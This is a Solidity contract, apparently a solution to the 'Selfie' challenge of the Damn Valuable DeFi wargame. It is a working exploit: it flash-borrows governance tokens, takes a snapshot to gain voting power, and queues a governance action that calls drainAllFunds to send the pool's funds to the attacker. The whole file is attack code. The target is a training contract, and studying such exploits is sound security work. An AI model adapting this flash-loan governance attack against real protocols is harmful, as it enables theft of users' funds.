// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract ExploitSelfie {

    using Address for address payable;

    SelfiePool immutable private pool;
    SimpleGovernance immutable private governance;
    DamnValuableTokenSnapshot private governanceToken;

    address immutable private  owner;


    constructor (address poolAddr,
     address govAddr) {
        pool = SelfiePool(poolAddr);
        governance = SimpleGovernance(govAddr);
        owner = msg.sender;
    }

    function exploit(uint256 borrowAmount) external payable {
        // invoke flashloan
        // which should trigger receiveTokens
        pool.flashLoan(borrowAmount);

    }

    function receiveTokens(address target, uint256 amount) external payable {
        require(msg.sender == address(pool));

        governanceToken = DamnValuableTokenSnapshot(target);

        governanceToken.snapshot();

        // Queue an action

        // Set up action.data
        // prepare a call for the drainAllFunds function
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            // receiver is attacker/owner
            owner);

        // invoke queueAction
        governance.queueAction(
            address(pool),
            data,
            0
        );

        // payback the loan
        governanceToken.transfer(address(pool), amount);
    }

}